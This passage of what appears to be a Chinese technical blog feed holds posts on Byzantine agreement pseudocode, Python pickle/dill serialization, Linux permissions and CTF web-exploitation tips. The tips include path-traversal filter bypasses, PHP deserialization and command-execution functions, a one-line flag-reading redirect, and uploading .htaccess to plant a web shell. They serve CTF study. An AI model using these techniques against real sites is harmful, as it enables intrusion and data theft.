decided(第8行)</span><br><span class="line">decision =xi</span><br></pre></td></tr></table></figure></p><ul><li><h3 id="带认证的拜占庭协定"><a href="#带认证的拜占庭协定" class="headerlink" title="带认证的拜占庭协定"></a>带认证的拜占庭协定</h3>同步模式下使用认证的拜占庭协定（bool型，容忍范围：f&lt;n）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">主节点下:</span><br><span class="line">if 输入值为1 then </span><br><span class="line">    广播value(1)p</span><br><span class="line">    将1设为决策值并终止运行</span><br><span class="line">else </span><br><span class="line">    将0设为决策值并终止运行</span><br><span class="line">end if</span><br><span class="line"></span><br><span class="line">其他所有节点上v上运行的代码：</span><br><span class="line"></span><br><span class="line">for all rounds i 属于1，2，......，f+1 do</span><br><span class="line">    S是所有value(1)u的消息集合</span><br><span class="line">    if |S|&gt;=i 并且value(1)p 属于S then</span><br><span class="line">        广播S与&#123;value(1)v&#125;</span><br><span class="line">        将1设为决策值并且终止运行</span><br><span class="line">    end if</span><br><span class="line">end for</span><br><span class="line">将0设置为决策值</span><br></pre></td></tr></table></figure></li></ul><p>Zyzzyva算法（可以支持非bool型）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">在时刻t,客户端u希望执行命令c</span><br><span class="line">客户u将请求R=request(c,t)发送到主节点p</span><br><span class="line">主节点p将c增加到它的本地历史中，hp=(hp,c)</span><br><span class="line">主节点p向所有的副本发送OR=orderedrequest(hp,c,r)_p</span><br><span class="line">point1:</span><br><span class="line">每个副本r将命令c增加到它的本地历史中，hr=(hr,c),并且检查hr=hp是否成立</span><br><span class="line">每个副本r执行命令ck,并得到运行结果a</span><br><span class="line">每个副本r向客户端发送Response(a，OR)_r</span><br><span class="line">客户端u将接收到的Response(a，OR)_r消息存放到结合S中</span><br><span class="line">客户端检查所有的历史hr是否一致</span><br><span class="line">if |S|=3f+1 then</span><br><span class="line">    客户端认为命令c以及完成</span><br><span class="line">end if </span><br><span class="line"></span><br><span class="line">if 2f+1&lt;=|S|&lt;3f+1 then</span><br><span class="line">    客户端u向所有的副本发送Commit(S)_u</span><br><span class="line">    每个副本r向u回复LocalCommit(S)_r</span><br><span class="line">    客户端u至少收集到2f+1条LocalCommit(S)_r消息，于是认为命令c已经完成</span><br><span class="line">end if</span><br><span class="line"></span><br><span class="line">if |S|&lt;2f+1 then</span><br><span class="line">    客户端u向所有的副本发送原始的R=Requst(c,t)_u消息</span><br><span class="line">    每个副本r向主节点发送一条ConfirmRequest(R)_r</span><br><span class="line">    if 主节点p回复消息OR then</span><br><span class="line">        副本r将OR转发给所有的其他副本</span><br><span class="line">        goto point1</span><br><span class="line">    else </span><br><span class="line">        副本r广播IHatePrimary_r以启动视图改变</span><br><span class="line">    end if</span><br><span class="line">    </span><br><span class="line">end if</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">视图改变协定</span><br><span class="line"></span><br><span class="line">所有副本持续接收IHatatePrimary_r消息，并将它们存放于集合H中</span><br><span class="line">if 某个副本接收到了|H|&gt;f消息或者接收到了一条有效的ViewChange消息 then</span><br><span class="line">    副本广播ViewChange(Hr,hr,Sr)_r</span><br><span class="line">    副本停止参与当前的视图格局</span><br><span class="line">    副本切换到下一个主节点p=p+1</span><br><span class="line">end if</span><br><span class="line"></span><br><span class="line">执行视图改变</span><br><span class="line">新的主结点p将收集到的ViewChange(Hr,hr,Sr)_r消息存入集合C</span><br><span class="line">if 新的主节点p接收到|C|&gt;=2f+1消息 then</span><br><span class="line">    新的主节点p向所有副本发送NewView(C)_p消息</span><br><span class="line">end if</span><br><span class="line"></span><br><span class="line">if 副本r接收到一条NewView(C)_p消息 then</span><br><span class="line">    </span><br><span class="line">    副本r恢复新的历史h_new：</span><br><span class="line">        C=包含NewView(C)_p中2f+1ViewChange(Hr,hr,Sr)_r条消息的集合</span><br><span class="line">        R=C中的副本</span><br><span class="line">        S_l=C中的汇报的最近提交证书</span><br><span class="line">        h_new=S_l中包含的历史h_l</span><br><span class="line">        k=l+1,下一个序列号</span><br><span class="line">        while 命令c_k 存在于C do</span><br><span class="line">            if c_k被至少f+1个副本汇报 then</span><br><span class="line">                从R中删除哪些不支持c_k的副本</span><br><span class="line">                h_new=(h_new,c_k)</span><br><span class="line">            end if</span><br><span class="line">            k=k+1</span><br><span class="line">        end while</span><br><span class="line">        return h_new</span><br><span class="line">    </span><br><span class="line">    副本r向所有的副本广播ViewConfirm(h_new)_r</span><br><span class="line">    </span><br><span class="line">if 副本接收到2f+1 ViewConfirm(h_new)_r消息 then</span><br><span class="line">        副本开始采用hr=h_new作为新的视图历史</span><br><span class="line">        副本r开始参与新的视图</span><br><span class="line">end if</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>python序列化的疑惑</title>
      <link href="/2018/02/25/python%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E7%96%91%E6%83%91/"/>
      <url>/2018/02/25/python%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E7%96%91%E6%83%91/</url>
      
        <content type="html"><![CDATA[<h3 id="pickle-与-dill"><a href="#pickle-与-dill" class="headerlink" title="pickle 与 dill"></a>pickle 与 dill</h3><p>谈及对象的序列化，pickle与dill也许是用得最为频繁的两个库了，dill可以说是pickle的进化版，它所支持的对象类型要更多，但是仍旧还有一些局限性。</p><h3 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a><a href="https://docs.python.org/3/library/pickle.html" target="_blank" rel="noopener">pickle</a></h3><h3 id="dill"><a href="#dill" class="headerlink" title="dill"></a><a href="https://pypi.python.org/pypi/dill" target="_blank" rel="noopener">dill</a></h3><p>对象序列化是一种把存储于内存中的数据以二进制（序列化）的形式保存到磁盘中，方便下次调用的同时释放内存压力。而以上过程的逆过程就是反序列化。python是一门面向对象的编程语言，有一句话在python里面很哲学那就是“万物皆对象”。所以拥有了类似的将python的对象序列化存储的工具，无疑将会给编程带来很大的方便。  </p><p>是的你没有理解错，就是连函数和class类型的对象也是可以被序列化的，也就是说，当你从磁盘使用load或者loads函数重新调用的时候会保留你实例化的python对象，并且该对象的方法也同样是可以调用的。那么基于这个原因，我们只需要使用短短两行代码就实现了这里面所说的所有序列化方法，就和你之前没有序列化时一摸一样。这样的底层封装思想可以给上层的程序员专注于实现应用本身而不是太多的在意轮子的制造。这或许就是python的简易，简洁的哲学吧。<br><a id="more"></a></p><p>同样的，对于一些特定的库，例如sklearn机器学习的库，本身就会有自己的一些序列化函数，例如“joblib”,这样的例子还有很多，他们的核心思想都是差不多的，特定的序列化函数（集成在一些大型库的内部）对于它要处理的数据类型和对象结构具有针对性，却不一定对其他的库有用。</p><p>好了说了这么多，来两个列子吧，这是最近在用scapy以及一些科学分析工具来做流量分析时候碰到的问题，所以这些感悟重新对序列化进行的一些反思。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> rdpcap</span><br><span class="line"><span class="keyword">import</span> dill</span><br><span class="line"></span><br><span class="line">print(<span class="string">"hello"</span>)</span><br><span class="line">ini_data=rdpcap(<span class="string">"test.pcapng"</span>)</span><br><span class="line">dill.dump(ini_data, open(<span class="string">"游戏"</span>, <span class="string">"wb"</span>))</span><br><span class="line">date=dill.load(open(<span class="string">"游戏"</span>,<span class="string">"rb"</span>))</span><br><span class="line">print(date[<span class="number">1</span>].show())</span><br></pre></td></tr></table></figure><p>首先，这里用pickle 是会报错的，具体原因笔者才疏，还没有很明白原因所在，报错中有“lambda”无名函数的关键字，然而笔者跟进到pickle库源码类中却没有发现“lambda”的函数所在，望以后能够渐渐弄明白。</p><p>同样笔者也看到官方文档中解释说在“functions defined at the top level of a module (using def, not lambda)”，笔者一知半解就去故意构造了一个类，其中使用了lambda来生成一个列表，发现这里是不会报错的。代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pickle_hello</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.name=<span class="string">"daming"</span></span><br><span class="line">        self.sex=<span class="string">'boy'</span></span><br><span class="line">        self.number=<span class="number">1.456468</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"hello"</span>,name)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">floor</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(math.floor(self.number))</span><br><span class="line">        </span><br><span class="line">        lis=filter(<span class="keyword">lambda</span> x:x+<span class="number">1</span>,[x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>)])</span><br><span class="line">        print(list(lis)[::<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">obj1=pickle_hello()</span><br><span class="line">pickle.dump(obj1,open(<span class="string">"t1"</span>,<span class="string">"wb"</span>))</span><br><span class="line">obj2=pickle.load(open(<span class="string">"t1"</span>,<span class="string">"rb"</span>))</span><br><span class="line">print(obj2.floor())</span><br></pre></td></tr></table></figure></p><p>先把问题记录在这，日后顿悟再回来补充……</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux权限</title>
      <link href="/2018/02/25/Linux%E6%9D%83%E9%99%90/"/>
      <url>/2018/02/25/Linux%E6%9D%83%E9%99%90/</url>
      
        <content type="html"><![CDATA[<h1 id="基本权限以及用户，用户组"><a href="#基本权限以及用户，用户组" class="headerlink" title="基本权限以及用户，用户组"></a>基本权限以及用户，用户组</h1><ul><li>execute(1),write(2),read(4)</li><li>拥有着，用户组（以及有效用户组的概念），其他人的概念，以及对应的权限显示格式“[-/d]xxx-xxx-xxx<br>-:表示的是文件<br>d(directory):表示的是目录  </li><li><p>权限三剑客：chown,chgrp,chmod(u,o,g,a;w,r,x;+,-,=)，umask(修改新建文件的默认权限)<a id="more"></a></p></li><li><p>用户信息存放地：/etc/passwd 另外：密码md5存放地：/etc/shadow<br>用户组的信息存放：/etc/groups<br>GID,UID的标识符</p></li><li>/etc/passwd的文件结构（按字段进行标号）：</li></ul><ol><li>账号名称</li><li>密码（现已保存在shadow文件中，该字段已经没有意义）</li><li>UID</li><li>GID</li><li>用户指纹信息（finger）</li><li>用户主文件夹</li><li>默认shell环境  </li></ol><ul><li>/etc/shadow文件结构（按字段标号）</li></ul><ol><li>账号名称</li><li>密码(md5加密)</li><li>最近更改时间</li><li>与最近更改时间相比密码不能更改的时间</li><li>密码需要重新更改的天数</li><li>在密码需要更改时提前警告的天数</li><li>过期宽限时间</li><li>账号失效时间</li><li>目前没有意义，保留字段  </li></ol><ul><li>/etc/group的文件结构</li></ul><ol><li>用户组名称</li><li>用户组密码</li><li>GID</li><li>该用户组的所有用户成员</li></ol><ul><li><p>常用的查看命令：whoami(查看当前登陆用户),who(类似于w以及单独使用的finger),groups(所属用户组),finger(查看用户指纹信息)，id(查看用户序号信息，uid,有效用户组gid,所有所属用户组gid）  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#查看所有用户</span><br><span class="line">cut -d : -f 1 /etc/passwd</span><br><span class="line">cat /etc/passwd |awk -F \: &apos;&#123;print $1&#125;&apos;#其他字段的查看依次类推</span><br></pre></td></tr></table></figure></li><li><p>常用操作命令：useradd，userdel，usermod,,finger,chfn(修改finger),passwd(以及chage),id,chsh(更改默认shell环境);groupadd,groupmod,groupdel,groupwd(用户组管理员功能)</p></li><li><p>常用的操作对应的底层文件及其内容   </p></li></ul><ol><li>指纹信息描述字段，也可以理解为账户备注：~/.plan(用户组文件夹的隐藏文件)  </li><li>useradd的参考文件：/etc/default/useradd</li><li>UID/GID以及相关参数： /etc/login.defs</li><li>主文件夹参考目录： /etc/skel/*</li></ol><h1 id="文件隐藏权限"><a href="#文件隐藏权限" class="headerlink" title="文件隐藏权限"></a>文件隐藏权限</h1><ul><li>在rwx三种权限之外还有着一些隐藏的权限，例如文件只允许追加，不能被删除和删除，两个命令：lsattr(显示隐藏属性)，chattr(修改隐藏属性，常用的有-i(文件锁定),-a(文件只能追加))  </li></ul><h1 id="文件的特殊权限"><a href="#文件的特殊权限" class="headerlink" title="文件的特殊权限"></a>文件的特殊权限</h1><ul><li>文件的特殊权限主要有三种：SUID,SGID,SBIT。在ls命令列出文件的相关权限后，有时候会在拥有者或者用户组字段出现”s”的标识符，这个s就是指SUID,SGID权限（二者的不同在于s出现的字段，当出现在用户字段，那么就是SUID,出现在用户组字段就是SGID),当在其他人的权限字段出现”t”的时候，就表示该目录具有SBIT的特殊权限。</li></ul><ol><li><p>SUID:拥有SUID权限的执行者在执行该二进制文件的时候临时具有所有者的权限<br>要求：<br>仅仅正对二进制文件有效<br>执行者需要对该程序具有x的可执行权限<br>SUID权限仅在该程序执行过程中有效 </p></li><li><p>SGID:拥有SGID权限文件的执行者在执行该二进制程序的时候具有用户组的权限<br>要求:<br>仅仅正对二进制文件有效<br>执行者需要对该程序具有x的可执行权限<br>SUID权限仅在该程序执行过程中有效</p></li><li><p>SBIT:用户在该目录下创建文件时只有自己与root才具有权力删除该文件夹<br>要求:<br>只对目录有效，SBIT只对目录可见，一般文件不具有这个权限<br>用户需要对这个目录具有w,x的权限  </p></li><li><p>SUID/SGID/SBIT对应的数字: SUID(4),SGID(2),SBIT(1)  </p></li><li>权限的设置同样是使用chmod命令，特殊权限的赋予有多种方式，如果使用数字权限赋予需要在最前面，如果使用（u,g,o,a）追加需要加在对应的位置:u+s/g+s以及o+t  </li></ol><h1 id="ACL个性化权限"><a href="#ACL个性化权限" class="headerlink" title="ACL个性化权限"></a>ACL个性化权限</h1><ul><li>区别于统一化的权限设置，例如，针对三种身份的权限设定，ACL(acecess control list)对单一的目录进行个性化的权限定制，定制的对象可以是单个用户，也可以是用户组。</li><li>setfacl与getfacl命令的使用</li></ul><h1 id="SELinux-Security-Enhanced-Linux"><a href="#SELinux-Security-Enhanced-Linux" class="headerlink" title="SELinux(Security-Enhanced Linux)"></a><a href="https://wiki.centos.org/zh/HowTos/SELinux" target="_blank" rel="noopener">SELinux(Security-Enhanced Linux)</a></h1><h1 id="linux下的用户身份转换"><a href="#linux下的用户身份转换" class="headerlink" title="linux下的用户身份转换"></a>linux下的用户身份转换</h1><ul><li>切换用户的身份有su和sudo两种方式</li><li>su可以进行任意用户的切换(su -l )，但是必须需要知道所要切换到的用户的密码，而sudo当然也可以切换到任意用户(sudo -u),但是切换的对象需要记载在配置文件里面，只不过sudo不需要知道将要切换的用户密码，只需要知道自己的密码就ok。而sudo的管理也还是比较方便的，只需要编写配置文件/etc/sudoers就可以了。</li><li>visudo方便的设置/etc/sudoers，/etc/sudoers文件下的字段含义：</li></ul><ol><li>用户账号</li><li>允许的登陆者来源主机</li><li>可以登陆到的主机即可以切换到身份</li><li>切换用户后可以执行的命令(多半是出于安全考虑)  </li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CTF</title>
      <link href="/2018/01/25/CTF/"/>
      <url>/2018/01/25/CTF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这是一篇不系统的，比较杂碎的ctf涉及的小技巧汇总，灵光一现的记录自己在做题或者看writeup中的一些小细节，正所谓“不积细流，无以成江海”。<br><a id="more"></a></p><h3 id="1-zip-—symble"><a href="#1-zip-—symble" class="headerlink" title="1.zip —symble"></a>1.zip —symble</h3><p>命令进行压缩后的文件是可以跨宿主机传递link信息的，然后解压成的文件会在新的宿主机里面进行新的连接，从而在php中的命令执行函数，如shell_exec（）解压命令可以造成宿主机信息泄露.<br><a href="https://www.rootnetsec.com/34c3ctf-junior-upload/" target="_blank" rel="noopener">例子传送门</a>  </p><h3 id="2-PHP的序列化与反序列化"><a href="#2-PHP的序列化与反序列化" class="headerlink" title="2.PHP的序列化与反序列化"></a>2.PHP的序列化与反序列化</h3><p>php反序列化成立的条件：</p></blockquote><ol><li>一个用户可空的反序列点</li><li>这个反序列点的过滤是不完全的，也即hacker可以去绕过过滤传入一个对象。</li><li>在程序中存在有一个或多个可以利用的魔术方法：<code>__construct()， __destruct()， __call()， __callStatic()， __get()， __set()， __isset()， __unset()， __sleep()， __wakeup()， __toString()，__invoke()， __set_state()， __clone() 和 __debugInfo()</code>  ,在这里我们主要关注点在于<code>__wakeup()</code>,<code>destruct()</code>,<code>__construst()</code>,其他魔术方法的利用方式的发掘相对来说还是比较困难的。</li><li>源码审计发现一条行之有效的链。</li></ol><p><a href="https://www.insomniasec.com/downloads/publications/Practical%20PHP%20Object%20Injection.pdf" target="_blank" rel="noopener">原理</a><br><a href="https://www.golaravel.com/post/magic-methods-and-magic-constants-in-php/" target="_blank" rel="noopener">常用魔术方法解析</a><br><a href="http://corb3nik.github.io/blog/insomnihack-teaser-2018/file-vault" target="_blank" rel="noopener">题目1:cookie腐朽序列化</a><br><a href="https://blog.hrdn.us/insomnihack-2018-vulnshop/" target="_blank" rel="noopener">题目2:session的序列化modify与eval执行</a><br><a href="http://w3shaman.com/article/how-does-php-session-work" target="_blank" rel="noopener">拓展阅读:session与cookie的关系以及作用机理</a><br>其中有一点需要明确：<br>cookie作为client端的认证。session作为server端的认证，二者的关系：<br>cookie作为server端的session序列化的文件名，而文件内容就是session的值，这样就是二者一一对应的关系。<br>session在server端的保存地址：C:\WINDOWS\Temp(windows); /tmp(linux)<br>cookie在client端的保存地：不同的操作系统不同的浏览器的保存位点一般不一样。<br>一句话总结：Basicly, all session variables stored as a file with format sess_(PHPSESSID) in folder session.save_path and the content stored as serialized string  </p><h3 id="3-PHP中的-REQUEST传参是具有默认顺序的，使用-REQUEST作为检测点往往会造成重写绕过。以下为php官方文档的user-note中的一段原话："><a href="#3-PHP中的-REQUEST传参是具有默认顺序的，使用-REQUEST作为检测点往往会造成重写绕过。以下为php官方文档的user-note中的一段原话：" class="headerlink" title="3.PHP中的$_REQUEST传参是具有默认顺序的，使用$_REQUEST作为检测点往往会造成重写绕过。以下为php官方文档的user note中的一段原话："></a>3.PHP中的$_REQUEST传参是具有默认顺序的，使用$_REQUEST作为检测点往往会造成重写绕过。以下为php官方文档的user note中的一段原话：</h3><p>Note you should use $_GET, $_POST and $_COOKIE seperately if you use same name or your not sure.Because there are “overwrite” problems with $_REQUEST :<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Example:  </span><br><span class="line">$_GET[<span class="string">'foo'</span>] is a <span class="string">'hello'</span> string   <span class="comment">//from user input</span></span><br><span class="line">$_POST[<span class="string">'foo'</span>] is a <span class="string">'world'</span> string   <span class="comment">//from user input  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Then the $_REQUEST['foo'] would be a 'world' string. The value 'hello' is overwritten.</span></span><br><span class="line"><span class="comment">#So don't use $_REQUEST to monitor user inputs.</span></span><br></pre></td></tr></table></figure></p><h6 id="例如：ctf一道sql注入题"><a href="#例如：ctf一道sql注入题" class="headerlink" title="例如：ctf一道sql注入题"></a><a href="https://rawsec.ml/en/SEC-T-2017-write-ups/#200-naughty-ads-web" target="_blank" rel="noopener">例如：ctf一道sql注入题</a></h6><h3 id="4-一个tip"><a href="#4-一个tip" class="headerlink" title="4.一个tip"></a>4.一个tip</h3><p>在bash shell 文件中将执行的输出写入到本文件，在ctf中限制了读取文件范围的时候，可以直接将输出结果以追加的方式重定向到可执行脚本中。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">cat /flag &gt;&gt; <span class="string">"./<span class="variable">$&#123;0##*/&#125;</span>"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#格式： command &gt;&gt; "./$&#123;0##*/&#125;"</span></span><br></pre></td></tr></table></figure></p><h5 id="ctf中一道使用例题"><a href="#ctf中一道使用例题" class="headerlink" title="ctf中一道使用例题"></a><a href="https://github.com/xPowerz/CTF-Writeups/tree/master/2018/Insomni&#39;hack%20teaser/VulnShop" target="_blank" rel="noopener">ctf中一道使用例题</a></h5><h3 id="5-本地文件包含中我们可以做的一些信息提取或者提权"><a href="#5-本地文件包含中我们可以做的一些信息提取或者提权" class="headerlink" title="5.本地文件包含中我们可以做的一些信息提取或者提权"></a>5.<a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="noopener">本地文件包含中我们可以做的一些信息提取或者提权</a></h3><h3 id="6-尝试不同的http请求方法"><a href="#6-尝试不同的http请求方法" class="headerlink" title="6.尝试不同的http请求方法"></a>6.<a href="https://rawsec.ml/en/TPCTF-2017-write-ups/#50-methods-web" target="_blank" rel="noopener">尝试不同的http请求方法</a></h3><h3 id="7-关于源码泄露"><a href="#7-关于源码泄露" class="headerlink" title="7.关于源码泄露"></a>7.<a href="https://www.secpulse.com/archives/55286.html" target="_blank" rel="noopener">关于源码泄露</a></h3><p><a href="http://4coders.ru/news/tuctf-2017-2017-web-writeup-high-source-cookie-duty-git-gud-cookie-harrelson-iframe-and-shame/" target="_blank" rel="noopener">例题1：git gud</a></p><p><a href="https://ctftime.org/task/5291" target="_blank" rel="noopener">例题2：.git实现备份还原 </a> </p><ul><li><p>还有一中比较常见的源码泄露：vim源码泄露<br>可以通过在文件名后追加~或者.swp就可以获取，这常在web类的url获取源码题中，有时获取到的问价是混乱的，我们可以使用linux下的命令回复文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r [混乱的文件名]</span><br></pre></td></tr></table></figure></li><li><p><a href="http://paper.tuisec.win/detail/655ba5d200c002d" target="_blank" rel="noopener">概括了一些java泄露源码的思路</a></p><h3 id="8-url编码绕过"><a href="#8-url编码绕过" class="headerlink" title="8.url编码绕过"></a>8.url编码绕过</h3><p><a href="http://www.codehead.co.uk/acebear-2018-url-param/" target="_blank" rel="noopener">一道php,执行ctf题</a>  </p></li></ul><h3 id="9-路径遍历中如果过滤函数为str-replace-quot-quot-quot-quot-变量-，可以使用-绕过，对于-被删除的filter-使用-思想绕过"><a href="#9-路径遍历中如果过滤函数为str-replace-quot-quot-quot-quot-变量-，可以使用-绕过，对于-被删除的filter-使用-思想绕过" class="headerlink" title="9.路径遍历中如果过滤函数为str_replace(&quot;../&quot;,&quot;./&quot;,$(变量))，可以使用.../绕过，对于../被删除的filter,使用....//思想绕过"></a>9.路径遍历中如果过滤函数为<code>str_replace(&quot;../&quot;,&quot;./&quot;,$(变量))</code>，可以使用<code>.../</code>绕过，对于<code>../</code>被删除的filter,使用<code>....//</code>思想绕过</h3><ul><li><a href="https://ctftime.org/writeup/9807" target="_blank" rel="noopener">BookDir</a><h3 id="10-一次很典型的sql注入的解题思路"><a href="#10-一次很典型的sql注入的解题思路" class="headerlink" title="10. 一次很典型的sql注入的解题思路"></a>10. <a href="https://ctftime.org/writeup/9070" target="_blank" rel="noopener">一次很典型的sql注入的解题思路</a></h3></li></ul><h3 id="11-php随机数预测crack"><a href="#11-php随机数预测crack" class="headerlink" title="11. php随机数预测crack"></a>11. <a href="http://note.youdao.com/http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/" target="_blank" rel="noopener">php随机数预测crack</a></h3><h3 id="12-php获取信息的-SERVER数组"><a href="#12-php获取信息的-SERVER数组" class="headerlink" title="12.php获取信息的$_SERVER数组"></a>12.php获取信息的$_SERVER数组</h3><ul><li>$_SERVER[‘HTTP_CLIENT_IP’],$_SERVER[‘HTTP_X_FORWARDED_FOR’]里面的用户ip是不可靠的（他们来自于用户的http请求头），只有$_SERVER[‘REMOTE_ADDR’]是基于tcp/ip协议底层的ip地址。</li></ul><h3 id="13-select-version-，可以用来过空格和正则，特殊情况下还可以将其做注释符用"><a href="#13-select-version-，可以用来过空格和正则，特殊情况下还可以将其做注释符用" class="headerlink" title="13.select `version()`   ，可以用来过空格和正则，特殊情况下还可以将其做注释符用"></a>13.<code>select</code> `version()`   ，可以用来过空格和正则，特殊情况下还可以将其做注释符用</h3><p><a href="https://github.com/rkmylo/ctf-write-ups/tree/master/2018-n1ctf/web/easy-php-540" target="_blank" rel="noopener">这是一道非常厉害的ctf题</a></p><h3 id="14-常用的命令执行函数："><a href="#14-常用的命令执行函数：" class="headerlink" title="14.常用的命令执行函数："></a>14.常用的命令执行函数：</h3><h5 id="14-1-exec-system-popen-shell-exec-与反撇号-执行的效果差不多-，passthru-proc-open，eval-这个不是系统命令执行，而实php代码执行"><a href="#14-1-exec-system-popen-shell-exec-与反撇号-执行的效果差不多-，passthru-proc-open，eval-这个不是系统命令执行，而实php代码执行" class="headerlink" title="14.1  exec,system,popen,shell_exec(与反撇号`执行的效果差不多)，passthru,proc_open，eval`(这个不是系统命令执行，而实php代码执行)"></a>14.1  <code>exec</code>,<code>system</code>,<code>popen</code>,<code>shell_exec</code>(与反撇号<code>`执行的效果差不多)，</code>passthru<code>,</code>proc_open<code>，</code>eval`(这个不是系统命令执行，而实php代码执行)</h5><h3 id="15-在绕过上传漏洞出现较多的文件后缀过滤的情况，可以尝试先上传-htaccess-修改绕过规则，然后再上传shell"><a href="#15-在绕过上传漏洞出现较多的文件后缀过滤的情况，可以尝试先上传-htaccess-修改绕过规则，然后再上传shell" class="headerlink" title="15. 在绕过上传漏洞出现较多的文件后缀过滤的情况，可以尝试先上传.htaccess 修改绕过规则，然后再上传shell."></a>15. 在绕过上传漏洞出现较多的文件后缀过滤的情况，可以尝试先上传.htaccess 修改绕过规则，然后再上传shell.</h3><h3 id="16-在一些支持file-XHR跨站请求的浏览器中，我们可以使用这个协议来获得文件内容。"><a href="#16-在一些支持file-XHR跨站请求的浏览器中，我们可以使用这个协议来获得文件内容。" class="headerlink" title="16. 在一些支持file,XHR跨站请求的浏览器中，我们可以使用这个协议来获得文件内容。"></a>16. 在一些支持file,XHR跨站请求的浏览器中，我们可以使用这个协议来获得文件内容。</h3><ul><li>这个点又常常在html-&gt;pdf的提交类web站点实现利用。<br><a href="https://github.com/Beers4Flags/writeups/tree/master/2018/NoNameCon/web/Bank" target="_blank" rel="noopener">例题：NoNameCon CTF Quals 2018 / Web / bank</a><br><a href="https://cure53.de/pentest-report_accessmyinfo.pdf" target="_blank" rel="noopener">相关知识点</a></li></ul><h3 id="17-关于referer请求头"><a href="#17-关于referer请求头" class="headerlink" title="17.关于referer请求头"></a>17.<a 